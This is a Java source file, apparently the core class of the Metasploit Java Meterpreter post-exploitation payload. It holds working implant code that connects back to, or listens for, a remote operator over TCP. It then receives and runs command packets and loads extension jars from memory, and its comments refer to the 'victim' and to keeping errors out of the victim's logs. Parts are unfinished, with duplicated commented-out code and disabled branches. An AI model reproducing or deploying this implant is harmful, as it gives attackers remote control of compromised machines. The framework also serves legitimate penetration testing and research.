package com.metasploit.meterpreter;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import java.util.jar.JarInputStream;

import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.core.core_loadlib;

/**
 * Main meterpreter class. Responsible for keeping all the stuff together and for managing channels.
 *
 * @author mihi
 */
public class Meterpreter {

    public static final int UUID_LEN = 16;
    public static final int URL_LEN = 512;

    private final TransportList transports = new TransportList();
    private byte[] uuid;
    private long sessionExpiry;

    private class TransportList {
        private Transport transport = null;
        private Transport nextTransport = null;
        private long wait = 0;

        public boolean isEmpty() {
            return this.transport == null;
        }

        public Transport current() {
            return this.transport;
        }

        public boolean changeRequested() {
            return this.nextTransport != null;
        }

        public void next(Meterpreter met) {
            if (this.wait > 0) {
                met.sleep(this.wait);
                this.wait = 0;
            }

            if (this.nextTransport == null) {
                this.transport = this.transport.getNext();
            } else {
                this.transport = this.nextTransport;
                this.nextTransport = null;
            }
        }

        public void add(Transport t) {
            if (this.transport == null) {
                // first transport, point it at itself
                t.setNext(t);
                t.setPrev(t);
                this.transport = t;
            } else {
                // wire it into the end of the circular list
                this.transport.getPrev().setNext(t);
                t.setPrev(this.transport.getPrev());
                t.setNext(this.transport);
                this.transport.setPrev(t);
            }
        }
    }

    private abstract class Transport {
        private Transport prev;
        private Transport next;

        protected String url;
        protected long commTimeout;
        protected long retryTotal;
        protected long retryWait;

        protected Transport(String url) {
            this.url = url;
        }

        protected int parseTimeouts(byte[] configuration, int offset) {
            // starts with the comms timeout
            this.commTimeout = 1000L * Meterpreter.unpack32(configuration, offset);
            System.out.println("msf : Comm timeout ms: " + this.commTimeout);
            offset += 4;

            // then we have the retry total
            this.retryTotal = 1000L * Meterpreter.unpack32(configuration, offset);
            System.out.println("msf : Retry total ms: " + this.retryTotal);
            offset += 4;

            // then we have the retry wait
            this.retryWait = 1000L * Meterpreter.unpack32(configuration, offset);
            System.out.println("msf : Retry Wait ms: " + this.retryWait);
            offset += 4;

            return offset;
        }

        protected abstract boolean tryConnect(Meterpreter met) throws IOException;

        public abstract int parseConfig(byte[] configuration, int offset);
        public abstract void bind(DataInputStream in, OutputStream rawOut);
        public abstract void disconnect();
        public abstract boolean dispatch(Meterpreter met, CommandManager commandManager);

        public boolean connect(Meterpreter met) {
            long lastAttempt = System.currentTimeMillis();

            while (System.currentTimeMillis() < lastAttempt + this.retryTotal) {
                try {
                    if (this.tryConnect(met)) {
                        return true;
                    }
                } catch (Exception e) {
                }

                met.sleep(this.retryWait);
            }

            return false;
        }
        public void setPrev(Transport t) {
            this.prev = t;
        }

        public void setNext(Transport t) {
            this.next = t;
        }

        public Transport getPrev() {
            return this.prev;
        }

        public Transport getNext() {
            return this.next;
        }
    }

    private class TcpTransport extends Transport {
        private Socket sock = null;
        private DataInputStream inputStream = null;
        private DataOutputStream outputStream = null;
        private String host;
        private int port;

        public TcpTransport(String url) {
            super(url);

            int portStart = url.lastIndexOf(":");
            this.port = Integer.parseInt(url.substring(portStart + 1));
            this.host = url.substring(url.lastIndexOf("/") + 1, portStart);
            System.out.println("msf : Host: " + this.host);
            System.out.println("msf : Port: " + this.port);
        }

        public void bind(DataInputStream in, OutputStream rawOut) {
            this.inputStream = in;
            this.outputStream = new DataOutputStream(rawOut);
        }

        public int parseConfig(byte[] configuration, int offset) {
            return this.parseTimeouts(configuration, offset);
        }

        public void disconnect() {
            if (this.inputStream != null) {
                try {
                    this.inputStream.close();
                }
                catch (IOException ex) {
                }
                this.inputStream = null;
            }
            if (this.outputStream != null) {
                try {
                    this.outputStream.close();
                }
                catch (IOException ex) {
                }
                this.outputStream = null;
            }
            if (this.sock != null) {
                try {
                    this.sock.close();
                }
                catch (IOException ex) {
                }
                this.sock = null;
            }
        }

        private void flushInputStream() throws IOException {
            // we can assume that the server is trying to send the second
            // stage at this point, so let's just read that in for now.
            System.out.println("msf : Flushing the input stream");
            // this includes 4 blobs of stuff we don't want
            for (int i = 0; i < 4; i++) {
                System.out.println("msf : Flushing the input stream: " + i);
                int blobLen = this.inputStream.readInt();
                System.out.println("msf : Discarding bytes: " + blobLen);
                byte[] throwAway = new byte[blobLen];
                this.inputStream.readFully(throwAway);
            }
        }

        protected boolean tryConnect(Meterpreter met) throws IOException {
            if (this.inputStream != null) {
                // we're already connected
                System.out.println("msf : Connecting on existing transport");
                return true;
            }

            if (this.host.equals("")) {
                ServerSocket server = new ServerSocket(this.port);
                this.sock = server.accept();
                server.close();
            } else {
                this.sock = new Socket(this.host, this.port);
            }

            if (this.sock != null) {
                this.sock.setSoTimeout(500);
                this.inputStream = new DataInputStream(this.sock.getInputStream());
                this.outputStream = new DataOutputStream(this.sock.getOutputStream());

                // this point we are effectively stageless, so flush the socket
                this.flushInputStream();

                return true;
            }

            return false;
        }

        /*
         *
    private TLVPacket executeCommand(TLVPacket request) throws IOException {
        TLVPacket response = new TLVPacket();
        String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
        if (method.equals("core_switch_url")) {
            String url = request.getStringValue(TLVType.TLV_TYPE_STRING);
            int sessionExpirationTimeout = request.getIntValue(TLVType.TLV_TYPE_UINT);
            int sessionCommunicationTimeout = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
            pollURL(new URL(url), sessionExpirationTimeout, sessionCommunicationTimeout);
            return null;
        } else if (method.equals("core_shutdown")) {
            return null;
        }
        TLVPacket response = new TLVPacket();
        String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
        response.add(TLVType.TLV_TYPE_METHOD, method);
        response.add(TLVType.TLV_TYPE_REQUEST_ID, request.getStringValue(TLVType.TLV_TYPE_REQUEST_ID));
        Command cmd = commandManager.getCommand(method);
        int result;
        try {
            result = cmd.execute(this, request, response);
        } catch (Throwable t) {
            t.printStackTrace(getErrorStream());
            result = Command.ERROR_FAILURE;
        }
        TLVPacket response = new TLVPacket();
        String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
        response.add(TLVType.TLV_TYPE_METHOD, method);
        response.add(TLVType.TLV_TYPE_REQUEST_ID, request.getStringValue(TLVType.TLV_TYPE_REQUEST_ID));
        Command cmd = commandManager.getCommand(method);
        int result;
        try {
            result = cmd.execute(this, request, response);
        } catch (Throwable t) {
            t.printStackTrace(getErrorStream());
            result = Command.ERROR_FAILURE;
        }
        response.add(TLVType.TLV_TYPE_RESULT, result);
        return response;
    }
         */

        public boolean dispatch(Meterpreter met, CommandManager commandManager) {
            System.out.println("msf : In the dispatch loop");
            long lastPacket = System.currentTimeMillis();
            while (!met.hasSessionExpired() &&
                System.currentTimeMillis() < lastPacket + this.commTimeout) {
                try {
                    System.out.println("msf : Waiting for packet");
                    int len = this.inputStream.readInt();
                    int type = this.inputStream.readInt();
                    TLVPacket request = new TLVPacket(this.inputStream, len - 8);

                    System.out.println("msf : Packet received");

                    // got a packet, update the timestamp
                    lastPacket = System.currentTimeMillis();

                    TLVPacket response = request.createResponse();
                    int result = commandManager.executeCommand(met, request, response);

                    byte[] data = response.toByteArray();
                    synchronized (this.outputStream) {
                        System.out.println("msf : sending response");
                        this.outputStream.writeInt(data.length + 8);
                        this.outputStream.writeInt(PACKET_TYPE_RESPONSE);
                        this.outputStream.write(data);
                        this.outputStream.flush();
                        System.out.println("msf : sent response");
                    }

                    if (result == Command.EXIT_DISPATCH) {
                        return true;
                    }
                } catch (SocketTimeoutException ex) {
                    // socket comms timeout, didn't get a packet,
                    // this is ok, so we ignore it
                    System.out.println("msf : Socket timeout (OK)");
                } catch (Exception ex) {
                    // any other type of exception isn't good.
                    System.out.println("msf : Some other exception: " + ex.getClass().getName());
                    break;
                }
            }

            // if we get here we assume things aren't good.
            return false;
        }
    }

    private void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configuration) {
        System.out.println("msf : Parsing configuration");
        // socket handle is 4 bytes, followed by exit func, both of
        // which we ignore.
        int csr = 8;

        // We start with the expiry, which is a 32 bit int
        setExpiry(unpack32(configuration, csr));
        System.out.println("msf : Unpacked expiry: " + this.sessionExpiry);
        csr += 4;

        // this is followed with the UUID
        this.uuid = readBytes(configuration, csr, UUID_LEN);
        System.out.println("msf : Read the UUID: " + this.uuid.length);
        csr += UUID_LEN;

        // here we need to loop through all the given transports, we know that we're
        // going to get at least one.
        while (configuration[csr] != '\0') {
            // read the transport URL
            String url = readString(configuration, csr, URL_LEN);
            System.out.println("msf : Read URL: " + url);
            csr += URL_LEN;

            Transport t = null;
            if (url.startsWith("tcp")) {
                t = new TcpTransport(url);
            } else {
                //t = new HttpTransport(url);
            }

            csr = t.parseConfig(configuration, csr);
            if (this.transports.isEmpty()) {
                System.out.println("msf : Binding the first transport");
                t.bind(in, rawOut);
            }
            this.transports.add(t);
        }
        
        // we don't currently support extensions, so when we reach the end of the
        // list of transports we just bomb out.
        System.out.println("msf : Finished parsing configuration");
    }

    public void setExpiry(long seconds) {
        System.out.println("msf : Setting expiry forward seconds " + seconds);
        this.sessionExpiry = System.currentTimeMillis() + seconds * 1000L;
    }

    public void sleep(long milliseconds) {
        try {
            Thread.sleep(milliseconds);
        } catch (InterruptedException ex) {
            // ignore
        }
    }

    public static String readString(byte[] bytes, int offset, int size) {
        return new String(readBytes(bytes, offset, size)).trim();
    }

    public static byte[] readBytes(byte[] bytes, int offset, int size) {
        byte[] buf = new byte[size];
        System.arraycopy(bytes, offset, buf, 0, size);
        return buf;
    }

    public static int unpack32(byte[] bytes, int offset) {
        int res = 0;
        for (int i = 0; i < 4; i++) {
          res = res | (((int)bytes[i + offset]) & 0xFF) << (i * 8);
        }
        return res;
    }

    private static final int PACKET_TYPE_REQUEST = 0;
    private static final int PACKET_TYPE_RESPONSE = 1;

    private List/* <Channel> */channels = new ArrayList();
    private final CommandManager commandManager;
    private final Random rnd = new Random();
    private final ByteArrayOutputStream errBuffer;
    private final PrintStream err;
    private final boolean loadExtensions;
    private List/* <byte[]> */tlvQueue = null;


    /**
     * Initialize the meterpreter.
     *
     * @param in             Input stream to read from
     * @param rawOut         Output stream to write into
     * @param loadExtensions Whether to load (as a {@link ClassLoader} would do) the extension jars; disable this if you want to use your debugger's edit-and-continue feature or if you do not want to update the jars after each build
     * @param redirectErrors Whether to redirect errors to the internal error buffer; disable this to see the errors on the victim's standard error stream
     * @throws Exception
     */
    public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors) throws Exception {
        this(in, rawOut, loadExtensions, redirectErrors, true);
    }

    /**
     * Initialize the meterpreter.
     *
     * @param in             Input stream to read from
     * @param rawOut         Output stream to write into
     * @param loadExtensions Whether to load (as a {@link ClassLoader} would do) the extension jars; disable this if you want to use your debugger's edit-and-continue feature or if you do not want to update the jars after each build
     * @param redirectErrors Whether to redirect errors to the internal error buffer; disable this to see the errors on the victim's standard error stream
     * @param beginExecution Whether to begin executing immediately
     * @throws Exception
     */
    public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors, boolean beginExecution) throws Exception {
        System.out.println("msf : Meterpreter constructing");

        int configLen = in.readInt();
        byte[] configBytes = new byte[configLen];
        in.readFully(configBytes);

        System.out.println("msf : Meterpreter config length: " + configLen);

        loadConfiguration(in, rawOut, configBytes);

        this.loadExtensions = loadExtensions;
        this.commandManager = new CommandManager();
        this.channels.add(null); // main communication channel?
        if (redirectErrors) {
            errBuffer = new ByteArrayOutputStream();
            err = new PrintStream(errBuffer);
        } else {
            errBuffer = null;
            err = System.err;
        }
        if (beginExecution) {
            startExecuting();
        }
    }

    public boolean hasSessionExpired() {
        return System.currentTimeMillis() > this.sessionExpiry;
    }

    public void startExecuting() throws Exception {
        System.out.println("msf : kicking off execution");
        while (!this.hasSessionExpired() && this.transports.current() != null) {
            if (!this.transports.current().connect(this)) {
                System.out.println("msf : connection failed, going to next transport");
                continue;
            }

            System.out.println("msf : entering dispatch");
            boolean cleanExit = this.transports.current().dispatch(this, this.commandManager);
            System.out.println("msf : dispatch exited " + (cleanExit ? "cleanly" : "badly"));
            this.transports.current().disconnect();

            if (cleanExit && !this.transports.changeRequested()) {
                break;
            }

            this.transports.next(this);
        }
        synchronized (this) {
            for (Iterator it = channels.iterator(); it.hasNext(); ) {
                Channel c = (Channel) it.next();
                if (c != null)
                    c.close();
            }
        }
    }

    protected String getPayloadTrustManager() {
        return "com.metasploit.meterpreter.PayloadTrustManager";
    }

    ///**
    // * Execute a command request.
    // *
    // * @param request The request to execute
    // * @return The response packet to send back
    // */
    //private TLVPacket executeCommand(TLVPacket request) throws IOException {
    //    TLVPacket response = new TLVPacket();
    //    String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
    //    if (method.equals("core_switch_url")) {
    //        String url = request.getStringValue(TLVType.TLV_TYPE_STRING);
    //        int sessionExpirationTimeout = request.getIntValue(TLVType.TLV_TYPE_UINT);
    //        int sessionCommunicationTimeout = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
    //        pollURL(new URL(url), sessionExpirationTimeout, sessionCommunicationTimeout);
    //        return null;
    //    } else if (method.equals("core_shutdown")) {
    //        return null;
    //    }
    //    response.add(TLVType.TLV_TYPE_METHOD, method);
    //    response.add(TLVType.TLV_TYPE_REQUEST_ID, request.getStringValue(TLVType.TLV_TYPE_REQUEST_ID));
    //    Command cmd = commandManager.getCommand(method);
    //    int result;
    //    try {
    //        result = cmd.execute(this, request, response);
    //    } catch (Throwable t) {
    //        t.printStackTrace(getErrorStream());
    //        result = Command.ERROR_FAILURE;
    //    }
    //    response.add(TLVType.TLV_TYPE_RESULT, result);
    //    return response;
    //}

    /**
     * Poll from a given URL until a shutdown request is received.
     *
     * @param url
     */
    //private void pollURL(URL url, int sessionExpirationTimeout, int sessionCommunicationTimeout) throws IOException {
    //    synchronized (this) {
    //        tlvQueue = new ArrayList();
    //    }
    //    int ecount = 0;
    //    long deadline = System.currentTimeMillis() + sessionExpirationTimeout * 1000L;
    //    long commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
    //    final byte[] RECV = "RECV".getBytes("ISO-8859-1");
    //    while (System.currentTimeMillis() < Math.min(commDeadline, deadline)) {
    //        byte[] outPacket = null;
    //        synchronized (this) {
    //            if (tlvQueue.size() > 0)
    //                outPacket = (byte[]) tlvQueue.remove(0);
    //        }
    //        TLVPacket request = null;
    //        try {
    //            URLConnection uc = url.openConnection();
    //            if (url.getProtocol().equals("https")) {
    //                // load the trust manager via reflection, to avoid loading
    //                // it when it is not needed (it requires Sun Java 1.4+)
    //                try {
    //                    Class.forName(getPayloadTrustManager()).getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
    //                } catch (Exception ex) {
    //                    ex.printStackTrace(getErrorStream());
    //                }
    //            }
    //            uc.setDoOutput(true);
    //            OutputStream out = uc.getOutputStream();
    //            out.write(outPacket == null ? RECV : outPacket);
    //            out.close();
    //            DataInputStream in = new DataInputStream(uc.getInputStream());
    //            int len;
    //            try {
    //                len = in.readInt();
    //            } catch (EOFException ex) {
    //                len = -1;
    //            }
    //            if (len != -1) {
    //                int ptype = in.readInt();
    //                if (ptype != PACKET_TYPE_REQUEST)
    //                    throw new RuntimeException("Invalid packet type: " + ptype);
    //                request = new TLVPacket(in, len - 8);
    //            }
    //            in.close();
    //            commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
    //        } catch (IOException ex) {
    //            ex.printStackTrace(getErrorStream());
    //            // URL not reachable
    //            if (outPacket != null) {
    //                synchronized (this) {
    //                    tlvQueue.add(0, outPacket);
    //                }
    //            }
    //        }
    //        if (request != null) {
    //            ecount = 0;
    //            TLVPacket response = executeCommand(request);
    //            if (response == null)
    //                break;
    //            writeTLV(PACKET_TYPE_RESPONSE, response);
    //        } else if (outPacket == null) {
    //            int delay;
    //            if (ecount < 10) {
    //                delay = 10 * ecount;
    //            } else {
    //                delay = 100 * ecount;
    //            }
    //            sleep(Math.min(10000, delay));
    //        }
    //    }
    //    synchronized (this) {
    //        tlvQueue = new ArrayList();
    //    }
    //}

    /**
     * Get the command manager, used to register or lookup commands.
     */
    public CommandManager getCommandManager() {
        return commandManager;
    }

    /**
     * Register a new channel in this meterpreter. Used only by {@link Channel#Channel(Meterpreter, java.io.InputStream, OutputStream, java.io.InputStream)}.
     *
     * @param channel The channel to register
     * @return The channel's ID.
     */
    public synchronized int registerChannel(Channel channel) {
        channels.add(channel);
        return channels.size() - 1;
    }

    /**
     * Used by {@link Channel#close()} to notify the meterpreter that the channel has been closed.
     *
     * @param id The channel's ID
     */
    public synchronized void channelClosed(int id) {
        channels.set(id, null);
    }

    /**
     * Obtain a channel for a given channel ID
     *
     * @param id                 The channel ID to look up
     * @param throwIfNonexisting Whether to throw an exception if the channel does not exist
     * @return The channel, or <code>null</code> if the channel does not exist and it should not throw an exception
     */
    public Channel getChannel(int id, boolean throwIfNonexisting) {
        Channel result = null;
        if (id < channels.size()) {
            result = (Channel) channels.get(id);
        }
        if (result == null && throwIfNonexisting) {
            throw new IllegalArgumentException("Channel " + id + " does not exist.");
        }
        return result;
    }

    /**
     * Return the error stream where all errors should be written to. Do <b>not</b> write to {@link System#out} or {@link System#err} as this might appear in the victim's error logs.
     */
    public PrintStream getErrorStream() {
        return err;
    }

    /**
     * Return the length of the currently buffered error stream content, or <code>-1</code> if no buffering is active.
     */
    public int getErrorBufferLength() {
        if (errBuffer == null) {
            return -1;
        }
        return errBuffer.size();
    }

    /**
     * Return the currently buffered error stream content, or <code>null</code> if no buffering is active.
     */
    public byte[] getErrorBuffer() {
        if (errBuffer == null) {
            return null;
        }
        synchronized (errBuffer) {
            byte[] result = errBuffer.toByteArray();
            errBuffer.reset();
            return result;
        }
    }

    /**
     * Send a request packet over this meterpreter.
     *
     * @param packet Packet parameters
     * @param method Method to invoke
     */
    public void writeRequestPacket(String method, TLVPacket tlv) throws IOException {
        tlv.add(TLVType.TLV_TYPE_METHOD, method);
        char[] requestID = new char[32];
        for (int i = 0; i < requestID.length; i++) {
            requestID[i] = (char) ('A' + rnd.nextInt(26));
        }
        tlv.add(TLVType.TLV_TYPE_REQUEST_ID, new String(requestID));
        // TODO: put this back in
        //writeTLV(PACKET_TYPE_REQUEST, tlv);
    }

    /**
     * Load an extension into this meterpreter. Called from {@link core_loadlib}.
     *
     * @param data The extension jar's content as a byte array
     */
    public String[] loadExtension(byte[] data) throws Exception {
        ClassLoader classLoader = getClass().getClassLoader();
        if (loadExtensions) {
            URL url = MemoryBufferURLConnection.createURL(data, "application/jar");
            classLoader = new URLClassLoader(new URL[]{url}, classLoader);
        }
        JarInputStream jis = new JarInputStream(new ByteArrayInputStream(data));
        String loaderName = (String) jis.getManifest().getMainAttributes().getValue("Extension-Loader");
        ExtensionLoader loader = (ExtensionLoader) classLoader.loadClass(loaderName).newInstance();
        commandManager.resetNewCommands();
        loader.load(commandManager);
        return commandManager.getNewCommands();
    }
}
